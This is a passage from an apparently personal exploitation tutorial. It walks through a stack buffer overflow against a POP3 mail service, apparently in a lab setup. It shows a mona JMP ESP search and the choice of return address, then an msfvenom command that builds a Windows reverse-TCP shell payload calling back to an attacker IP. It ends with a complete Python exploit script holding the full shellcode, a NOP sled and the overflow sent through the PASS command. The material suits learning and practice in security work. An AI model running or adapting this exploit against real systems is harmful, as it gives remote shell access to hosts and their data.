![img](https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LMNRaGfniDGOexfu2Y6%2F-LTy4mJZ1obv8guGsBqk%2F-LTy6h5PM8kC1O7NPz4_%2FScreen%20Shot%202018-12-17%20at%204.41.53%20PM.png?alt=media&token=33f849e0-6d0a-4b36-9148-ce95511fc3b5) 

*Source: https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/buffer-overflow*



**Mona Find JMP ESP**

```python
!mona find –s “\xff\xe4” –m SLMFC.dll
```



![img](https://i.imgur.com/bWADdRO.png)





Woah! We have quite a few results here, let's look for a memory location of `JMP ESP` instruction and ensure that it has no bad characters in, Remember our bad chars are `\x0a` `\x00` `\x0d` so we have to ensure that any memory locations we choose (left pane) do not contain any of these chars. 



There are actually a couple options here but I went with `0x5f4a358f` which translates too `\x8f\x35\x4a\x5f` after removing the leading-zero and reversing due to little-endian. 



Perfect so `\x8f\x35\x4a\x5f` will now act as our **return address**.





### [](#header-3) Generating Shellcode and Adding NOPS



This is always the fun part! Generating the payload. I normally use msfvenom to use this due to the simplicity so let's jump straight into it.



```bash
m0chan@kali:/> msfvenom -p windows/shell_reverse_tcp LHOST=172.16.10.12 LPORT=443 EXITFUNC=thread -f c -a x86 --platform windows -b "\x00\x0a\x0d"
```



**Assemble The Exploit**



Now bringing all the pieces together;

- **Buffer Size** - `2606 Bytes`
- **Return-Address** - `\x8f\x35\x4a\x5f`
- **NOPS** - `"\x90" * 16`
- **Shellcode** - MSFVenom Output



Combining the 4 elements from above we end up with the below exploit.

```python
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode = (
"\xbe\xa8\x2f\xd7\xf1\xdb\xc0\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x52\x31\x75\x12\x83\xc5\x04\x03\xdd\x21\x35\x04\xe1\xd6\x3b"
"\xe7\x19\x27\x5c\x61\xfc\x16\x5c\x15\x75\x08\x6c\x5d\xdb\xa5"
"\x07\x33\xcf\x3e\x65\x9c\xe0\xf7\xc0\xfa\xcf\x08\x78\x3e\x4e"
"\x8b\x83\x13\xb0\xb2\x4b\x66\xb1\xf3\xb6\x8b\xe3\xac\xbd\x3e"
"\x13\xd8\x88\x82\x98\x92\x1d\x83\x7d\x62\x1f\xa2\xd0\xf8\x46"
"\x64\xd3\x2d\xf3\x2d\xcb\x32\x3e\xe7\x60\x80\xb4\xf6\xa0\xd8"
"\x35\x54\x8d\xd4\xc7\xa4\xca\xd3\x37\xd3\x22\x20\xc5\xe4\xf1"
"\x5a\x11\x60\xe1\xfd\xd2\xd2\xcd\xfc\x37\x84\x86\xf3\xfc\xc2"
"\xc0\x17\x02\x06\x7b\x23\x8f\xa9\xab\xa5\xcb\x8d\x6f\xed\x88"
"\xac\x36\x4b\x7e\xd0\x28\x34\xdf\x74\x23\xd9\x34\x05\x6e\xb6"
"\xf9\x24\x90\x46\x96\x3f\xe3\x74\x39\x94\x6b\x35\xb2\x32\x6c"
"\x3a\xe9\x83\xe2\xc5\x12\xf4\x2b\x02\x46\xa4\x43\xa3\xe7\x2f"
"\x93\x4c\x32\xff\xc3\xe2\xed\x40\xb3\x42\x5e\x29\xd9\x4c\x81"
"\x49\xe2\x86\xaa\xe0\x19\x41\x79\xe4\x2b\x88\xe9\x07\x2b\xab"
"\x52\x8e\xcd\xc1\xb4\xc7\x46\x7e\x2c\x42\x1c\x1f\xb1\x58\x59"
"\x1f\x39\x6f\x9e\xee\xca\x1a\x8c\x87\x3a\x51\xee\x0e\x44\x4f"
"\x86\xcd\xd7\x14\x56\x9b\xcb\x82\x01\xcc\x3a\xdb\xc7\xe0\x65"
"\x75\xf5\xf8\xf0\xbe\xbd\x26\xc1\x41\x3c\xaa\x7d\x66\x2e\x72"
"\x7d\x22\x1a\x2a\x28\xfc\xf4\x8c\x82\x4e\xae\x46\x78\x19\x26"
"\x1e\xb2\x9a\x30\x1f\x9f\x6c\xdc\xae\x76\x29\xe3\x1f\x1f\xbd"
"\x9c\x7d\xbf\x42\x77\xc6\xdf\xa0\x5d\x33\x48\x7d\x34\xfe\x15"
"\x7e\xe3\x3d\x20\xfd\x01\xbe\xd7\x1d\x60\xbb\x9c\x99\x99\xb1"
"\x8d\x4f\x9d\x66\xad\x45")

buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90"*16 + shellcode

try:
	print "\nSending evil buffer..."
	s.connect(('bof.local',110))
	data = s.recv(1024)
	s.send('USER username' + '\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!."
except:
	print "Could not connect to POP"



```



Now we run and we should pop a reverse shell.



![img](https://i.imgur.com/D73KVlu.png)